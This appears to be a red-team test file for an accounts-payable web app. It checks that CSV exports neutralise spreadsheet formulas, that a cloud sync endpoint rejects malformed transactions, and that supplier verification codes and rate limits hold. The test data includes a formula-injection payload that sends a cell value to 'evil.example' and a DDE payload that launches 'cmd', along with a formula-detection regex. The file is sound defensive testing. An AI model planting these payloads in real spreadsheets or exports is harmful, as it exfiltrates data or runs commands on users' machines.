// Red team round 4 (web, 9 November): exports never carry a formula; the cloud trusts only a typed transaction body and
// its validated columns; supplier verification codes cannot be run through by a local process.
import http, { request } from "node:http";
import type { AddressInfo } from "node:net";
import { describe, expect, it } from "vitest";
import { invoicesCsv, journalCsv, apJournal } from "../src/ap/books.js";
import { apInvoices } from "../src/ap/store.js";
import { csvCell } from "../src/lib/csv.js";
import { payablesApp } from "../src/servers/payables.js";
import { EN } from "./fakes/apInvoices.js";
import { UK } from "./fakes/fxInvoices.js";
import { testCloud } from "./support/cloud.js";
import { parserOnly, world } from "./support/rt4World.js";

const FORMULA = /(^|,)("?)[=+@]|(^|,)("?)-[^0-9]/m;

describe("red team 4, web", () => {
  it("5: the local invoices and journal exports never carry a formula from a PDF", async () => {
    const w = await world();
    await w.add(EN.replace("Bergtex Textil GmbH", '=HYPERLINK("http://evil.example/?d="&B2,"Bergtex")'), "evil.pdf");
    const inv = invoicesCsv(apInvoices(w.db));
    const jr = journalCsv(apJournal(w.db));
    for (const csv of [inv, jr]) for (const line of csv.split("\n").slice(1)) expect({ line, formula: FORMULA.test(line) }).toEqual({ line, formula: false });
    expect(inv).toContain(`"'=HYPERLINK(`);
  });

  it("5b: a cell keeps a plain number (also a negative one) and neutralises everything else that starts like a formula", () => {
    expect(csvCell("-12.00")).toBe("-12.00");
    expect(csvCell("1850.00")).toBe("1850.00");
    expect(csvCell("-2+3+cmd|' /C calc'!A0")).toBe("'-2+3+cmd|' /C calc'!A0");
    expect(csvCell("@SUM(1)")).toBe("'@SUM(1)");
    expect(csvCell("=1+1")).toBe("'=1+1");
    expect(csvCell("a,b")).toBe('"a,b"');
  });

  it("7, 11: the cloud refuses a transaction body that is not a register row, or that contradicts its columns", async () => {
    const c = testCloud();
    try {
      const t = await c.tenant("acme");
      const sk = (await c.req("POST", "/v1/keys", { key: t.key, body: { name: "runner", scopes: ["sync"] } })).json.api_key as string;
      const good = {
        id: "tx1", at: "2026-11-02T10:00:00Z", direction: "out", flow: "out", rail: "metal", rail_label: "Metal", description: "x", counterparty: "y", counterparty_account: null,
        amount: "10.00", currency: "EUR", eur_equivalent: "10.00", fee: null, moved: true, status: "paid", status_words: "paid", invoice: null,
        approval: { required: false, authority: "a", proposal_id: null, decision: null, method: null, approved_at: null, terms_sha256: null },
        booking: { entry_ids: [], accounts: [], booked: null }, proof: "0xabc", reconciliation: "matched", reconciliation_words: "Booked and matched", flags: [],
      };
      const push = (body: Record<string, unknown>, cols: Record<string, unknown> = {}) => c.req("POST", "/v1/sync", { key: sk, body: { transactions: [{ id: "tx1", at: "2026-11-02T10:00:00Z", rail: "metal", direction: "out", currency: "EUR", moved: true, reconciliation: "matched", ...cols, body }] } });
      const refused = async (r: Promise<{ status: number }>) => expect([400, 422]).toContain((await r).status);
      await refused(push({ ...good, amount: "-2+3+cmd|' /C calc'!A0" }));
      await refused(push({ ...good, direction: "=1+1" }));
      await refused(push({ ...good, flags: ["=6*7"] }));
      await refused(push({ id: "tx1" }));
      await refused(push({ ...good, direction: "in" }));
      expect((await push(good)).status).toBe(200);
      expect((await c.req("GET", "/v1/transactions/summary", { key: t.key })).status).toBe(200);
      const csv = await (await c.fetch("https://cloud.test/v1/transactions/export.csv", { headers: { authorization: `Bearer ${t.key}` } })).text();
      expect(csv).toContain("tx1");
      for (const line of csv.split("\r\n").slice(1).filter(Boolean)) expect({ line, formula: FORMULA.test(line) }).toEqual({ line, formula: false });
    } finally { c.close(); }
  });

  it("6: verification codes: one live at a time, wrong answers count across codes, and loopback is one client for the rate limit", async () => {
    const w = await world();
    const lines: string[] = [];
    const server = payablesApp(w.db, { inbox: { dir: w.dir, reader: parserOnly }, rail: null, notify: (l) => lines.push(l), rateLimit: { windowMs: 60_000, limit: 40 } }).listen(0, "127.0.0.1");
    await new Promise<void>((r) => server.once("listening", () => r()));
    const port = (server.address() as AddressInfo).port;
    const base = `http://127.0.0.1:${port}`;
    const agents = new Map<string, http.Agent>();
    const call = (method: string, path: string, o: { csrf?: string; body?: unknown; from?: string } = {}) => new Promise<{ status: number; text: string }>((resolve, reject) => {
      const from = o.from ?? "127.0.0.1";
      if (!agents.has(from)) agents.set(from, new http.Agent({ localAddress: from } as http.AgentOptions));
      const s = o.body === undefined ? "" : JSON.stringify(o.body);
      const r = request({ host: "127.0.0.1", port, method, path, agent: agents.get(from), headers: { host: `127.0.0.1:${port}`, origin: base, "content-length": String(Buffer.byteLength(s)), ...(o.csrf ? { "x-csrf": o.csrf } : {}), ...(o.body !== undefined ? { "content-type": "application/json" } : {}) } }, (res) => {
        let text = ""; res.setEncoding("utf8").on("data", (c: string) => (text += c)).on("end", () => resolve({ status: res.statusCode ?? 0, text }));
      });
      r.on("error", reject); r.end(s);
    });
    try {
      const csrf = /<meta name="csrf" content="([^"]+)">/.exec((await call("GET", "/")).text)![1]!;
      const id = await w.add(UK, "uk.pdf");
      const add = JSON.parse((await call("POST", `/api/payables/invoices/${id}/supplier-request`, { csrf })).text) as { add_id: string };
      expect((await call("POST", `/api/payables/suppliers/${add.add_id}/verify-code`, { csrf })).status).toBe(200);
      // A second code while one is live: refused.
      expect((await call("POST", `/api/payables/suppliers/${add.add_id}/verify-code`, { csrf })).status).toBe(429);
      const body = { by: "x", how: "called the number on file in our contract and confirmed", street: "s", city: "c", postcode: "p", iban_last4: "6819" };
      // Nine wrong answers across codes lock the request.
      let wrong = 0;
      for (let round = 0; round < 3; round++) {
        for (let i = 0; i < 3; i++) { await call("POST", `/api/payables/suppliers/${add.add_id}/verify`, { csrf, body: { ...body, code: "000000" } }); wrong++; }
        if (round < 2) expect((await call("POST", `/api/payables/suppliers/${add.add_id}/verify-code`, { csrf })).status).toBe(200);
      }
      expect(wrong).toBe(9);
      const locked = await call("POST", `/api/payables/suppliers/${add.add_id}/verify-code`, { csrf });
      expect(locked.status).toBe(429);
      expect(locked.text).toMatch(/too many wrong/);
      // The rate limit counts loopback as one client: another 127.x address does not get a fresh allowance.
      let limited = 0;
      for (let i = 0; i < 40; i++) if ((await call("GET", "/api/payables/invoices", { from: i % 2 ? "127.0.0.2" : "127.0.0.3" })).status === 429) limited++;
      expect(limited).toBeGreaterThan(0);
    } finally { server.close(); for (const a of agents.values()) a.destroy(); }
  });
});
